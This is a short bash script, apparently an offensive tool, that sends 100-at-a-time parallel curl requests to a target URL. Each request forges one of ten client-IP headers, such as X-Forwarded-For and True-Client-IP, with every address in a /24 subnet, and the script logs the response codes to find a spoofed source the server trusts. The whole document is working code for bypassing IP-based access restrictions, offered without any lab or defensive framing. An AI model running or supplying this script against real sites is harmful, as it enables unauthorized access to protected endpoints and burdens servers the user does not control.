#!/bin/bash

if [ $# -ne 2 ]; then
  echo "Usage: $0 <target_url> <ip_address>"
  exit 1
fi

target_url=$1
ip_address=$2

echo "Target URL: $target_url"
echo "IP Address: $ip_address"

subnet_headers=("X-Originating-IP" "X-Forwarded-For" "X-Forwarded" "Forwarded-For" "X-Remote-IP" "X-Remote-Addr" "X-ProxyUser-Ip" "X-Original-URL" "Client-IP" "True-Client-IP")

subnet=$(echo "$ip_address" | cut -d '.' -f 1-3)

results_file="results.txt"
> "$results_file"

send_request() {
  local ip=$1
  local header=$2
  local result
  result=$(curl -s -o /dev/null -w "%{http_code}" -k -H "$header: $ip" "$target_url")
  echo "${header}: $ip - $result"
}

n=0
maxjobs=100
total_iterations=$((255 * ${#subnet_headers[@]}))
for i in {1..255}; do
  ip="${subnet}.${i}"
  for header in "${subnet_headers[@]}"; do
    send_request "$ip" "$header" >> "$results_file" &
    if (( $(($((++n)) % $maxjobs)) == 0 )) ; then
      wait
    fi
    completed_rows=$(wc -l < "$results_file")
    echo -ne "Completion: $(awk "BEGIN{printf \"%.2f\", $completed_rows * 100 / $total_iterations}")%\r"
  done
done

wait

echo "HTTP requests completed. Results saved in $results_file"
